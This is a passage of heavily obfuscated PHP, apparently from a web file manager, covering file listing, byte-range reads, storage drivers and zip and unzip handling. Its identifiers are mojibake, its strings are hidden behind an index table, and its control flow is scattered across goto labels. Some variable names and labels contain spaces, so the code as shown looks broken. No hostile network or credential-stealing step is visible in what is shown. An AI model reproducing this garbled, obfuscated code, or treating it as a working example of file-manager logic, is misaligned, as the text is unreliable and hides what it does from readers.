} if ($dŠØ¹·æÙ[$F¼øœ‡’˜][$fƒ¹ê”Á×‰[78]] == $b¸ÁœßáÔâ[$fƒ¹ê”Á×‰[78]]) { continue; } } if ($b¸ÁœßáÔâ[$fƒ¹ê”Á×‰[77]] == 1) { $b‚ËŠ¦µ†™[] = $f…æ÷Õ—§¶ . $fƒ¹ê”Á×‰[8] . $F¼øœ‡’˜; continue; } $d¢×ƒö†„ = strstr(trim($F¼øœ‡’˜, $fƒ¹ê”Á×‰[8]), $fƒ¹ê”Á×‰[8]) ? get_path_father($F¼øœ‡’˜) : $fƒ¹ê”Á×‰[33]; $DÓñ‘‘µ†‡[] = array($fƒ¹ê”Á×‰[1045] => $b¸ÁœßáÔâ[$fƒ¹ê”Á×‰[76]], $fƒ¹ê”Á×‰[1046] => rtrim($f…æ÷Õ—§¶, $fƒ¹ê”Á×‰[8]) . $fƒ¹ê”Á×‰[8] . $d¢×ƒö†„, $fƒ¹ê”Á×‰[1047] => $b¸ÁœßáÔâ); } $b½¬¤èí¢ = array($fƒ¹ê”Á×‰[193] => $DÓñ‘‘µ†‡, $fƒ¹ê”Á×‰[77] => $b‚ËŠ¦µ†™); goto f—ÎÒ÷—Ú; a®ºò¿‹¤: } private static function _listAll($FÂİ¹Õ àÜ) { $CÄ¾®ºÓ‡» =& $_SERVER[æ§›¦ÌáØ]; $FÂİ¹Õ àÜ = KodIO::clear($FÂİ¹Õ àÜ); $a¾Š£š˜ˆ = IO::listAll($FÂİ¹Õ àÜ); foreach ($a¾Š£š˜ˆ as &$dˆ•Íê¤…Æ) { $fäØƒİÓ™ = substr($dˆ•Íê¤…Æ[$CÄ¾®ºÓ‡»[76]], strlen($FÂİ¹Õ àÜ)); $dˆ•Íê¤…Æ[$CÄ¾®ºÓ‡»[1049]] = trim($fäØƒİÓ™, $CÄ¾®ºÓ‡»[8]); } unset($dˆ•Íê¤…Æ); return array_to_keyvalue($a¾Š£š˜ˆ, $CÄ¾®ºÓ‡»[1049]); } public static function fileSubstr($Eù™ÚÜÆ—¬, $Cµœ™‹´, $c š“º©ì± = false) { goto D×÷¥¨ø; AÌ¯“õ¡: if ($c š“º©ì± <= 0) { return $B–¤¥­°[33]; } if ($Cµœ™‹´ < 0 || $Cµœ™‹´ >= $aíğˆ†åä || $c š“º©ì± > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\x65\122\145\141\144\40\145\x72\x72\157\x72\41\x20\x73\x74\141\162\x74\x3d{$Cµœ™‹´}\x3b\x6c\x65\x6e\147\x74\150\75{$c š“º©ì±}\73\x20\x73\151\172\x65\x3d{$aíğˆ†åä}\73"); } $fù…½Ú¤ë¾ = $cˆ±Êˆ‰Õ->fileSubstr($Eù™ÚÜÆ—¬, $Cµœ™‹´, $c š“º©ì±); goto AÑ¢ªºğ; D×÷¥¨ø: $B–¤¥­° =& $_SERVER[æ§›¦ÌáØ]; $cˆ±Êˆ‰Õ = self::driverMake($Eù™ÚÜÆ—¬); $aíğˆ†åä = $cˆ±Êˆ‰Õ->size($Eù™ÚÜÆ—¬); goto D¯Õ®ôƒªï; fßÑ«àÓƒ : if ($c š“º©ì± === !1) { $c š“º©ì± = $aíğˆ†åä - $Cµœ™‹´; } if ($Cµœ™‹´ + $c š“º©ì± > $aíğˆ†åä) { $c š“º©ì± = $aíğˆ†åä - $Cµœ™‹´; } if (!$aíğˆ†åä && $cˆ±Êˆ‰Õ->getType() == $B–¤¥­°[106] && !$cˆ±Êˆ‰Õ->exist($Eù™ÚÜÆ—¬)) { throw new Exception($B–¤¥­°[1050] . LNG($B–¤¥­°[1051]) . $B–¤¥­°[915] . get_path_this($Eù™ÚÜÆ—¬) . $B–¤¥­°[33]); } goto AÌ¯“õ¡; D¯Õ®ôƒªï: $C”Ğ—è¤ï = $Cµœ™‹´; $CâØ©‡¼Ÿ = $c š“º©ì±; if ($Cµœ™‹´ < 0) { $Cµœ™‹´ = $aíğˆ†åä + $Cµœ™‹´; } goto fßÑ«àÓƒ ; AÑ¢ªºğ: if (!$fù…½Ú¤ë¾ && $c š“º©ì± && isset($GLOBALS[$B–¤¥­°[1052]])) { throw new Exception($GLOBALS[$B–¤¥­°[1052]][$B–¤¥­°[1053]]); } return $fù…½Ú¤ë¾; goto Fõ´ĞÌï«Â; Fõ´ĞÌï«Â: } private static function driverMake(&$AŒ¦¾ôòˆÓ) { goto cŞİ·ÄÔèè; DÑÛªßÆ³: if ($aƒïÜÆš«®[$Eàìˆ¿Õï[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aƒïÜÆš«®[$Eàìˆ¿Õï[393]]]) { return !1; } $AŒ¦¾ôòˆÓ = $aƒïÜÆš«®[$Eàìˆ¿Õï[1054]]; $EÑ©Æ‘ãÀ– = self::driverGet($aƒïÜÆš«®, $AŒ¦¾ôòˆÓ); goto AÙ³ï­ÕƒÓ; AÙ³ï­ÕƒÓ: return $EÑ©Æ‘ãÀ–; goto fˆ”†ĞÚ¸Š; cŞİ·ÄÔèè: $Eàìˆ¿Õï =& $_SERVER[æ§›¦ÌáØ]; $aƒïÜÆš«® = KodIO::parse($AŒ¦¾ôòˆÓ); if (!self::$driverListSystem) { $cäšÂùì² = Model($Eàìˆ¿Õï[720])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($cäšÂùì², $Eàìˆ¿Õï[393]); } goto DÑÛªßÆ³; fˆ”†ĞÚ¸Š: } private static function driverGet($c‚¶ÎÌ¹«, &$D ¨õé®¤Ş) { goto EĞƒì×À÷; f¸ñÍÊ˜â”: $A”À×ãë½ = self::$driverCache[$DœóöÓˆÌœ]; $A”À×ãë½->pathDriver = $f‘‰È›¡Œ“; $A”À×ãë½->pathBase = $b°¯ß‹§®[33]; goto FÁ“ç•ã¿; EøœÁÈÛ·…: $A”À×ãë½->path = $D ¨õé®¤Ş; return $A”À×ãë½; goto bµ³Ë‰ä“—; EĞƒì×À÷: $b°¯ß‹§® =& $_SERVER[æ§›¦ÌáØ]; $f‘‰È›¡Œ“ = $c‚¶ÎÌ¹«[$b°¯ß‹§®[1055]]; $E°èÈäËÎ¡ = $c‚¶ÎÌ¹«[$b°¯ß‹§®[393]]; goto bê•¼–¦¥Ä; FÁ“ç•ã¿: if (isset($BòÇ°àö¦³[$b°¯ß‹§®[6]][$b°¯ß‹§®[1066]])) { $A”À×ãë½->pathBase = rtrim($BòÇ°àö¦³[$b°¯ß‹§®[6]][$b°¯ß‹§®[1066]], $b°¯ß‹§®[8]) . $b°¯ß‹§®[8]; $D ¨õé®¤Ş = $A”À×ãë½->pathBase . ltrim($D ¨õé®¤Ş, $b°¯ß‹§®[8]); } $D ¨õé®¤Ş = $A”À×ãë½->getPath($D ¨õé®¤Ş); if (isset($c‚¶ÎÌ¹«[$b°¯ß‹§®[1038]])) { $D ¨õé®¤Ş = $c‚¶ÎÌ¹«[$b°¯ß‹§®[1038]]; } goto EøœÁÈÛ·…; bê•¼–¦¥Ä: switch ($c‚¶ÎÌ¹«[$b°¯ß‹§®[29]]) { case KodIO::KOD_IO: $BòÇ°àö¦³ = self::$driverListSystem[$E°èÈäËÎ¡]; break; case KodIO::KOD_SOURCE: $D ¨õé®¤Ş = $E°èÈäËÎ¡ . $D ¨õé®¤Ş; $BòÇ°àö¦³ = array($b°¯ß‹§®[1056] => $b°¯ß‹§®[1057], $b°¯ß‹§®[6] => $c‚¶ÎÌ¹«); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $cÑ°¦×”ÄÑ = $GLOBALS[$b°¯ß‹§®[1058]]; self::$driverListUser = array_to_keyvalue($cÑ°¦×”ÄÑ, $b°¯ß‹§®[393]); } $BòÇ°àö¦³ = self::$driverListUser[$E°èÈäËÎ¡]; break; case KodIO::KOD_SHARE_LINK: $BòÇ°àö¦³ = array($b°¯ß‹§®[1056] => $b°¯ß‹§®[1059], $b°¯ß‹§®[6] => $c‚¶ÎÌ¹«); $C¿Ä­Íñ®Ó = Action($b°¯ß‹§®[1060])->sharePathInfo($c‚¶ÎÌ¹«[$b°¯ß‹§®[76]]); $D ¨õé®¤Ş = $C¿Ä­Íñ®Ó[$b°¯ß‹§®[395]]; if (!$C¿Ä­Íñ®Ó[$b°¯ß‹§®[395]]) { $b‹Ÿ—È¦ = Model($b°¯ß‹§®[576])->getInfo($C¿Ä­Íñ®Ó[$b°¯ß‹§®[468]]); $D ¨õé®¤Ş = KodIO::clear($b‹Ÿ—È¦[$b°¯ß‹§®[1061]] . $c‚¶ÎÌ¹«[$b°¯ß‹§®[1054]]); $c‚¶ÎÌ¹«[$b°¯ß‹§®[466]] = $b‹Ÿ—È¦; $c‚¶ÎÌ¹«[$b°¯ß‹§®[1038]] = $D ¨õé®¤Ş; $BòÇ°àö¦³ = array($b°¯ß‹§®[1056] => $b°¯ß‹§®[1062], $b°¯ß‹§®[6] => $c‚¶ÎÌ¹«); } break; case KodIO::KOD_SHARE_ITEM: $BòÇ°àö¦³ = array($b°¯ß‹§®[1056] => $b°¯ß‹§®[1063], $b°¯ß‹§®[6] => $c‚¶ÎÌ¹«); $b‹Ÿ—È¦ = Model($b°¯ß‹§®[576])->getInfo($c‚¶ÎÌ¹«[$b°¯ß‹§®[393]]); if ($b‹Ÿ—È¦[$b°¯ß‹§®[395]] == $b°¯ß‹§®[191]) { $D ¨õé®¤Ş = KodIO::clear($b‹Ÿ—È¦[$b°¯ß‹§®[1061]] . $c‚¶ÎÌ¹«[$b°¯ß‹§®[1054]]); $c‚¶ÎÌ¹«[$b°¯ß‹§®[466]] = $b‹Ÿ—È¦; $c‚¶ÎÌ¹«[$b°¯ß‹§®[1038]] = $D ¨õé®¤Ş; $BòÇ°àö¦³ = array($b°¯ß‹§®[1056] => $b°¯ß‹§®[1064], $b°¯ß‹§®[6] => $c‚¶ÎÌ¹«); } else { if (!$D ¨õé®¤Ş) { $D ¨õé®¤Ş = $b‹Ÿ—È¦[$b°¯ß‹§®[395]]; } } break; default: $D ¨õé®¤Ş = $c‚¶ÎÌ¹«[$b°¯ß‹§®[76]]; $BòÇ°àö¦³ = array($b°¯ß‹§®[1056] => $b°¯ß‹§®[1065]); break; } $DœóöÓˆÌœ = $c‚¶ÎÌ¹«[$b°¯ß‹§®[76]]; if (!isset(self::$driverCache[$DœóöÓˆÌœ])) { $c¸Áœ˜íÀ… = strtolower($BòÇ°àö¦³[$b°¯ß‹§®[94]]); $A‡ÉÀê–äÜ = $GLOBALS[$b°¯ß‹§®[6]][$b°¯ß‹§®[88]][$b°¯ß‹§®[784]]; $D‘æËÅ„Â = $b°¯ß‹§®[72] . (isset($A‡ÉÀê–äÜ[$c¸Áœ˜íÀ…]) ? $A‡ÉÀê–äÜ[$c¸Áœ˜íÀ…] : ucfirst($c¸Áœ˜íÀ…)); if (!class_exists($D‘æËÅ„Â)) { show_json("{$D‘æËÅ„Â}\40\156\157\x74\40\x65\x78\151\x73\164\163\x21", !1); } $b±³¼Î´Ë¤ = isset($BòÇ°àö¦³[$b°¯ß‹§®[6]]) ? $BòÇ°àö¦³[$b°¯ß‹§®[6]] : !1; self::$driverCache[$DœóöÓˆÌœ] = new $D‘æËÅ„Â($b±³¼Î´Ë¤); } goto f¸ñÍÊ˜â”; bµ³Ë‰ä“—: } public static function errorTips($A‘Øó¢¼è = false) { goto Aå™ñàµÅ‰; Aå™ñàµÅ‰: $eÈ·‘³Ü±Ò =& $_SERVER[æ§›¦ÌáØ]; static $E÷¾¢•Ëä = array(); $a×Øë˜ßÉ = 1000; goto c–† œÑ£Ø; c–† œÑ£Ø: if ($A‘Øó¢¼è === -1) { return $E÷¾¢•Ëä ? $E÷¾¢•Ëä[count($E÷¾¢•Ëä) - 1] : $eÈ·‘³Ü±Ò[33]; } if ($A‘Øó¢¼è === !1) { return implode($eÈ·‘³Ü±Ò[229], $E÷¾¢•Ëä); } if (count($E÷¾¢•Ëä) >= $a×Øë˜ßÉ) { $E÷¾¢•Ëä = array_slice($E÷¾¢•Ëä, $a×Øë˜ßÉ * 0.5, $a×Øë˜ßÉ); } goto a…¥¤šñ£ö; a…¥¤šñ£ö: $E÷¾¢•Ëä[] = $A‘Øó¢¼è; write_log($eÈ·‘³Ü±Ò[160] . ACTION . $eÈ·‘³Ü±Ò[1067] . $A‘Øó¢¼è, $eÈ·‘³Ü±Ò[1068]); goto FªŠ½¨Ë¾; FªŠ½¨Ë¾: } public static function getLastError($A‚Ô¸ã© = '') { $a‹Ôò°×£‡ = self::errorTips(-1); return $a‹Ôò°×£‡ ? $a‹Ôò°×£‡ : $A‚Ô¸ã©; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $f§ ˆÕĞ; if (!$f§ ˆÕĞ) { $CÏÃá¢Å = IO::init($_SERVER[æ§›¦ÌáØ][8]); } return $CÏÃá¢Å; } private static function iconvSystem($C¡óšİ¼ï) { return self::local()->iconvSystem($C¡óšİ¼ï); } private static function iconvApp($DĞË£‡šÅË) { return self::local()->iconvApp($DĞË£‡šÅË); } public static function zip($aÉ¢ÔéàêÒ, $c®‚Šõ…° = "\x7a\x69\160", $c×ßËôÒ‚Œ = '', $D¦¦Ñ‰«‡ = REPEAT_RENAME) { goto a†Ëí¢£Ã; d˜îìğ¤ˆ„: if ($c×ßËôÒ‚Œ || !$AÙÉËŒø’Î) { if ($AÙÉËŒø’Î && strstr($AÙÉËŒø’Î, TEMP_FILES)) { $E•İ«ÃÉ«Ø = $C×¯ò¬Æê˜ = array(); recursion_dir($AÖ¸ë¿ÉÉ·, $E•İ«ÃÉ«Ø, $C×¯ò¬Æê˜, 0); foreach ($E•İ«ÃÉ«Ø as $fà…¦ºŒÜ½) { del_dir($fà…¦ºŒÜ½); } foreach ($C×¯ò¬Æê˜ as $A¡ÅŠğ‡×¾) { if ($A¡ÅŠğ‡×¾ == $bËˆ¨ºƒµ˜) { continue; } del_file($A¡ÅŠğ‡×¾); } } return $eó™š–é „; } $fÜ»Ù²› = self::pathFather($e¸¹‡¢Ëæô[$cæ¨¶Œ¢[76]]); $f¾µâÔÛ†ë = self::move($eó™š–é „, $fÜ»Ù²›, $D¦¦Ñ‰«‡); goto E¹ÔŒñÈ•ë; E¹ÔŒñÈ•ë: if (!$f¾µâÔÛ†ë) { del_dir($AÙÉËŒø’Î); show_json(LNG($cæ¨¶Œ¢[1071]), !1); } del_dir($AÙÉËŒø’Î); return $f¾µâÔÛ†ë; goto A®Û÷Çôâ; a†Ëí¢£Ã: $cæ¨¶Œ¢ =& $_SERVER[æ§›¦ÌáØ]; $EÙ¦œï—“× = self::init($aÉ¢ÔéàêÒ[0][$cæ¨¶Œ¢[76]]); $e¸¹‡¢Ëæô = self::info($aÉ¢ÔéàêÒ[0][$cæ¨¶Œ¢[76]]); goto e‰—¼ø²Ğ¬; aô¢ºê ¼‹: foreach ($C×¯ò¬Æê˜ as $b••”¤„ï => $eÇìé¾–ï’) { $C×¯ò¬Æê˜[$b••”¤„ï] = self::iconvSystem($eÇìé¾–ï’); } KodArchive::create($bËˆ¨ºƒµ˜, $C×¯ò¬Æê˜); if (!IO::exist($eó™š–é „)) { if ($AÙÉËŒø’Î) { del_dir($AÙÉËŒø’Î); } show_json(LNG($cæ¨¶Œ¢[1071]), !1); } goto d˜îìğ¤ˆ„; côë‹ŒÅÆ¿: if (count($C×¯ò¬Æê˜) > 1) { $bÓæÍ·š¨¼ = IO::info(IO::pathFather($e¸¹‡¢Ëæô[$cæ¨¶Œ¢[76]])); $Fì™‘ôÄ½Ë = $bÓæÍ·š¨¼[$cæ¨¶Œ¢[28]]; } $AÖ¸ë¿ÉÉ· = $AÙÉËŒø’Î; if (!$AÖ¸ë¿ÉÉ·) { $AÖ¸ë¿ÉÉ· = get_path_father($e¸¹‡¢Ëæô[$cæ¨¶Œ¢[76]]); if (!$c×ßËôÒ‚Œ && $EÙ¦œï—“×->getType() == $cæ¨¶Œ¢[106]) { $AÖ¸ë¿ÉÉ· = get_path_father($EÙ¦œï—“×->path); } $b²µÚØƒÁ› = IO::info($AÖ¸ë¿ÉÉ·); if (!$b²µÚØƒÁ›[$cæ¨¶Œ¢[196]]) { show_json(LNG($cæ¨¶Œ¢[1070]), !1); } } goto bğš¯Ñ‘«‚; e‰—¼ø²Ğ¬: $AÙÉËŒø’Î = !1; if (!$c×ßËôÒ‚Œ && $EÙ¦œï—“×->getType() == $cæ¨¶Œ¢[106]) { $C×¯ò¬Æê˜ = self::zipFileList($aÉ¢ÔéàêÒ); } else { $AÙÉËŒø’Î = $c×ßËôÒ‚Œ ? $c×ßËôÒ‚Œ : TEMP_FILES . $cæ¨¶Œ¢[1069] . time() . rand_string(8) . $cæ¨¶Œ¢[8]; mk_dir($AÙÉËŒø’Î); $C×¯ò¬Æê˜ = self::zipFileList($aÉ¢ÔéàêÒ, $AÙÉËŒø’Î); } $Fì™‘ôÄ½Ë = $e¸¹‡¢Ëæô[$cæ¨¶Œ¢[28]]; goto côë‹ŒÅÆ¿; bğš¯Ñ‘«‚: $eó™š–é „ = $AÖ¸ë¿ÉÉ· . $Fì™‘ôÄ½Ë . $cæ¨¶Œ¢[95] . $c®‚Šõ…°; $eó™š–é „ = get_filename_auto($eó™š–é „, $cæ¨¶Œ¢[33], $D¦¦Ñ‰«‡); $bËˆ¨ºƒµ˜ = self::iconvSystem($eó™š–é „); goto aô¢ºê ¼‹; A®Û÷Çôâ: } public static function unzip($c™ââ¼Ûå«, $C–Í±Ñå = "\162\145\x70\x6c\x61\143\x65") { goto F­¤ˆØ˜òƒ; AÙİèĞ¾‹±: if (!($B¼·°Æ‹¸Ñ = parent::info($Eî¦³¢•îŒ))) { show_json(LNG($EŠ–ÒŒë[1073]), !1); } if (!($aŞŸŒä¬°® = parent::infoFull($cÁø‡œôÒ·))) { $cÁø‡œôÒ· = parent::mkdir($cÁø‡œôÒ·); $aŞŸŒä¬°® = array($EŠ–ÒŒë[76] => $cÁø‡œôÒ·); } else { if (isset($aŞŸŒä¬°®[$EŠ–ÒŒë[395]]) && trim($aŞŸŒä¬°®[$EŠ–ÒŒë[76]], $EŠ–ÒŒë[8]) != trim($cÁø‡œôÒ·, $EŠ–ÒŒë[8])) { $E„¾¡ŸÆÂ = KodIO::make($aŞŸŒä¬°®[$EŠ–ÒŒë[478]]); $FîÆ˜÷×øñ = parent::fileNameAuto($E„¾¡ŸÆÂ, $aŞŸŒä¬°®[$EŠ–ÒŒë[28]], REPEAT_RENAME_FOLDER, !0); $cÁø‡œôÒ· = parent::mkdir($E„¾¡ŸÆÂ . $FîÆ˜÷×øñ); $aŞŸŒä¬°® = array($EŠ–ÒŒë[76] => $cÁø‡œôÒ·); } } $cÁø‡œôÒ· = $aŞŸŒä¬°®[$EŠ–ÒŒë[76]]; goto Cõ‹‰ŒÕè; b‡×ƒ§Ñ«‡: if (!@file_exists(self::iconvSystem($eÍ…Ğ¼ƒé))) { $d¼¦Ø±µìÈ = self::localFilePath($Eî¦³¢•îŒ, $ağÅ ¢…˜); $eÍ…Ğ¼ƒé = $d¼¦Ø±µìÈ ? $d¼¦Ø±µìÈ : parent::download($Eî¦³¢•îŒ, $eÍ…Ğ¼ƒé); } $eÍ…Ğ¼ƒé = self::iconvSystem($eÍ…Ğ¼ƒé); $f¼Ó…æ˜Á = isset($c™ââ¼Ûå«[$EŠ–ÒŒë[1074]]) ? $c™ââ¼Ûå«[$EŠ–ÒŒë[1074]] : $EŠ–ÒŒë[1075]; goto C·Ì²Í·¦É; DæË…í¬Ï: return !0; goto c¼²Â™¶ºî; c½²ÜãÎ: foreach ($dÇ”¥á³×² as $DçÙÏ„ä®—) { $DçÙÏ„ä®— = self::iconvApp($DçÙÏ„ä®—); self::move($DçÙÏ„ä®—, $cÁø‡œôÒ·, $C–Í±Ñå); } del_dir($Dˆ‚®ø®ØØ); if (!$d¼¦Ø±µìÈ) { del_file($eÍ…Ğ¼ƒé); } goto DæË…í¬Ï; a†›“•±: Hook::trigger($EŠ–ÒŒë[1079], $Dˆ‚®ø®ØØ); recursion_dir($Dˆ‚®ø®ØØ, $C‹ôÛ‹¹Ï, $fáÊ‚«öØÃ, 0); $dÇ”¥á³×² = array_merge($C‹ôÛ‹¹Ï, $fáÊ‚«öØÃ); goto c½²ÜãÎ; F­¤ˆØ˜òƒ: $EŠ–ÒŒë =& $_SERVER[æ§›¦ÌáØ]; $Eî¦³¢•îŒ = $c™ââ¼Ûå«[$EŠ–ÒŒë[76]]; $cÁø‡œôÒ· = $c™ââ¼Ûå«[$EŠ–ÒŒë[1072]]; goto AÙİèĞ¾‹±; F­ˆùæğóç: mk_dir($Dˆ‚®ø®ØØ); $ağÅ ¢…˜ = self::fileExt($B¼·°Æ‹¸Ñ); $eÍ…Ğ¼ƒé = $Dˆ‚®ø®ØØ . $EŠ–ÒŒë[95] . $ağÅ ¢…˜; goto b‡×ƒ§Ñ«‡; Cõ‹‰ŒÕè: $bïÑ«ŸÄ•ˆ = self::tmpFileName($B¼·°Æ‹¸Ñ); $Dˆ‚®ø®ØØ = TEMP_FILES . $bïÑ«ŸÄ•ˆ; del_dir($Dˆ‚®ø®ØØ); goto F­ˆùæğóç; C·Ì²Í·¦É: $dÃ£é¿Øöõ = KodArchive::extract($eÍ…Ğ¼ƒé, $Dˆ‚®ø®ØØ . $EŠ–ÒŒë[8], $f¼Ó…æ˜Á); self::archiveExt(); if (!$dÃ£é¿Øöõ[$EŠ–ÒŒë[1076]]) { show_json($EŠ–ÒŒë[1077] . $dÃ£é¿Øöõ[$EŠ–ÒŒë[1078]], !1); } goto a†›“•±; c¼²Â™¶ºî: } public static function unzipList($EÜâî×¯“) { goto C­ËÄ‡Ó; BìĞ£êá‹ó: return $d¬²å¼â[$eæÌœ î¿½[1078]]; goto cÂß»é•¦½; A…å‘Û„: self::archiveExt(); del_dir($eöÔàâÍÖ); if (!$d¬²å¼â[$eæÌœ î¿½[1076]]) { show_json($d¬²å¼â[$eæÌœ î¿½[1078]], !1); } goto dÌ ö½‘•Ğ; FºäÎƒ‰…§: $b¤ì‰Û„éğ = 50000; if (request_url_safe($E“ó¥…ÙÌŞ)) { $bÎ¼ŞŸà·· = parse_url_query($E“ó¥…ÙÌŞ); if (!isset($bÎ¼ŞŸà··[$eæÌœ î¿½[76]])) { show_json($eæÌœ î¿½[1081], !1); } } $e¢ãƒöã„˜ = isset($bÎ¼ŞŸà··) ? $bÎ¼ŞŸà··[$eæÌœ î¿½[76]] : $E“ó¥…ÙÌŞ; goto dŞ¨ĞóÈÀ; Dí‡‘œ­Ú: $b”óãÀİâ = self::iconvSystem($b”óãÀİâ); if ($dä¾®¯Ô >= 0) { $eğ†ä‰Õ¦ = isset($EÜâî×¯“[$eæÌœ î¿½[1084]]) ? $EÜâî×¯“[$eæÌœ î¿½[1084]] : !1; $cÇÒˆöÄÏä = isset($EÜâî×¯“[$eæÌœ î¿½[28]]) ? $EÜâî×¯“[$eæÌœ î¿½[28]] : $eæÌœ î¿½[33]; KodArchive::filePreview($b”óãÀİâ, $dä¾®¯Ô, $eğ†ä‰Õ¦, $cÇÒˆöÄÏä); self::archiveExt(); die; } $d¬²å¼â = KodArchive::listContent($b”óãÀİâ); goto A…å‘Û„; dÌ ö½‘•Ğ: $F“ÖÜ’£ = json_encode($d¬²å¼â[$eæÌœ î¿½[1078]]); self::setContent($aÂÉ­¢ù´, $F“ÖÜ’£); if (count($d¬²å¼â[$eæÌœ î¿½[1078]]) >= $b¤ì‰Û„éğ) { show_json(sprintf(LNG($eæÌœ î¿½[1082]), count($d¬²å¼â[$eæÌœ î¿½[1078]])), !1); } goto BìĞ£êá‹ó; C­ËÄ‡Ó: $eæÌœ î¿½ =& $_SERVER[æ§›¦ÌáØ]; $E“ó¥…ÙÌŞ = $EÜâî×¯“[$eæÌœ î¿½[76]]; $dä¾®¯Ô = isset($EÜâî×¯“[$eæÌœ î¿½[1080]]) ? $EÜâî×¯“[$eæÌœ î¿½[1080]] : -1; goto FºäÎƒ‰…§; DÀîäô¨µÈ: if (!is_dir($eöÔàâÍÖ)) { mk_dir($eöÔàâÍÖ); } $b”óãÀİâ = $eöÔàâÍÖ . $eæÌœ î¿½[8] . $dô¡ŒƒÇ½ñ; if (!@file_exists(self::iconvSystem($b”óãÀİâ))) { if (isset($bÎ¼ŞŸà··)) { url_request($E“ó¥…ÙÌŞ, $eæÌœ î¿½[1083], $b”óãÀİâ); } else { $e‡¯„¸¢» = self::localFilePath($E“ó¥…ÙÌŞ, $cª¼ŞÈ‘»â); $b”óãÀİâ = $e‡¯„¸¢» ? $e‡¯„¸¢» : self::download($E“ó¥…ÙÌŞ, $b”óãÀİâ); } } goto Dí‡‘œ­Ú; dŞ¨ĞóÈÀ: $f…‚©‘§ = self::info($e¢ãƒöã„˜); $cª¼ŞÈ‘»â = self::fileExt($f…‚©‘§); $d¿ƒ°Éäº = self::tmpFileName($f…‚©‘§); goto A—²ººçÒô; A—²ººçÒô: if (isset($bÎ¼ŞŸà··)) { $cöíÀÑÁÒÀ = array($bÎ¼ŞŸà··[$eæÌœ î¿½[76]], $bÎ¼ŞŸà··[$eæÌœ î¿½[1080]], $bÎ¼ŞŸà··[$eæÌœ î¿½[28]]); $dô¡ŒƒÇ½ñ = md5(implode($eæÌœ î¿½[71], $cöíÀÑÁÒÀ)) . $eæÌœ î¿½[95] . get_path_ext($bÎ¼ŞŸà··[$eæÌœ î¿½[28]]); } else { $cöíÀÑÁÒÀ = array($f…‚©‘§[$eæÌœ î¿½[28]], $f…‚©‘§[$eæÌœ î¿½[76]], $f…‚©‘§[$eæÌœ î¿½[78]]); $dô¡ŒƒÇ½ñ = md5(implode($eæÌœ î¿½[71], $cöíÀÑÁÒÀ)) . $eæÌœ î¿½[95] . $cª¼ŞÈ‘»â; } if ($dä¾®¯Ô == -1) { $aÂÉ­¢ù´ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\x69\145\167\x2f{$d¿ƒ°Éäº}\x2f{$dô¡ŒƒÇ½ñ}\x2e\154\157\x67"; $fÓÂ“Ãæ÷‘ = self::infoFull($aÂÉ­¢ù´); if ($fÓÂ“Ãæ÷‘) { $aÂÉ­¢ù´ = $fÓÂ“Ãæ÷‘[$eæÌœ î¿½[76]]; $c‹ö¥²ìº¦ = self::getContent($aÂÉ­¢ù´); if ($c‹ö¥²ìº¦) { $F“ÖÜ’£ = json_decode($c‹ö¥²ìº¦, !0); if (count($F“ÖÜ’£) >= $b¤ì‰Û„éğ) { show_json(sprintf(LNG($eæÌœ î¿½[1082]), count($F“ÖÜ’£)), !1); } return $F“ÖÜ’£; } } else { $aÂÉ­¢ù´ = self::mkfile($aÂÉ­¢ù´); } } $eöÔàâÍÖ = TEMP_FILES . $d¿ƒ°Éäº; goto DÀîäô¨µÈ; cÂß»é•¦½: } private static function fileExt($cŠ¯¹¸ìŸË) { $C¥¼ØÍÉº =& $_SERVER[æ§›¦ÌáØ]; $f‰£Î®åÛ› = $cŠ¯¹¸ìŸË[$C¥¼ØÍÉº[168]]; if ($f‰£Î®åÛ› == $C¥¼ØÍÉº[1085]) { $Cœ–ò²ê÷ = $C¥¼ØÍÉº[1086]; if (substr($cŠ¯¹¸ìŸË[$C¥¼ØÍÉº[28]], -strlen($Cœ–ò²ê÷)) == $Cœ–ò²ê÷) { $f‰£Î®åÛ› = $C¥¼ØÍÉº[1087]; } } self::archiveExt($f‰£Î®åÛ›); return $f‰£Î®åÛ›; } private static function zipFileList($B‹‘İ±«­, $bÁ ¼™„Á = false) { $d´Ê¨ÔÛ¹¥ =& $_SERVER[æ§›¦ÌáØ]; $cåö‚”œ‡› = array(); foreach ($B‹‘İ±«­ as $cê®Öœ—Î¡) { $FÑéâÉ¹À× = $cê®Öœ—Î¡[$d´Ê¨ÔÛ¹¥[76]]; if ($bÁ ¼™„Á) { $FÑéâÉ¹À× = self::copy($cê®Öœ—Î¡[$d´Ê¨ÔÛ¹¥[76]], $bÁ ¼™„Á, $d´Ê¨ÔÛ¹¥[776]); } else { $CÄ½äõ­ÃÏ = self::init($cê®Öœ—Î¡[$d´Ê¨ÔÛ¹¥[76]]); if ($CÄ½äõ­ÃÏ->getType() == $d´Ê¨ÔÛ¹¥[106]) { $FÑéâÉ¹À× = $CÄ½äõ­ÃÏ->path; } } if ($FÑéâÉ¹À× && self::local()->exist($FÑéâÉ¹À×)) { $cåö‚”œ‡›[$cê®Öœ—Î¡[$d´Ê¨ÔÛ¹¥[76]]] = $FÑéâÉ¹À×; } } if (!empty($cåö‚”œ‡›)) { return array_values($cåö‚”œ‡›); } show_json(LNG($d´Ê¨ÔÛ¹¥[1051]), !1); } public static function tmpFileName($cÄâÓÁš¶») { $Cİ…Ë¡¦É† =& $_SERVER[æ§›¦ÌáØ]; $A¿ÁŸÛ„Îê = array($cÄâÓÁš¶»[$Cİ…Ë¡¦É†[28]], $cÄâÓÁš¶»[$Cİ…Ë¡¦É†[76]], $cÄâÓÁš¶»[$Cİ…Ë¡¦É†[78]], $cÄâÓÁš¶»[$Cİ…Ë¡¦É†[502]]); return md5(implode($Cİ…Ë¡¦É†[71], $A¿ÁŸÛ„Îê)); } private static function localFilePath($D˜ğĞñ§Ï“, $f·’İù›¸Å) { goto F¥Üî‘¢é¬; d¤ØšœÁÌ’: if ($D‚šß¬”Ã” == $EºÊÉÜÆÃ[106] || $D‚šß¬”Ã” == $EºÊÉÜÆÃ[1091]) { if (!$aôÍßà¥¼->exist($aôÍßà¥¼->path)) { show_json(LNG($EºÊÉÜÆÃ[105]), !1); } return $aôÍßà¥¼->path; } return !1; goto d¡Ã½é¦‰æ; F¥Üî‘¢é¬: $EºÊÉÜÆÃ =& $_SERVER[æ§›¦ÌáØ]; if ($f·’İù›¸Å == $EºÊÉÜÆÃ[1088] && 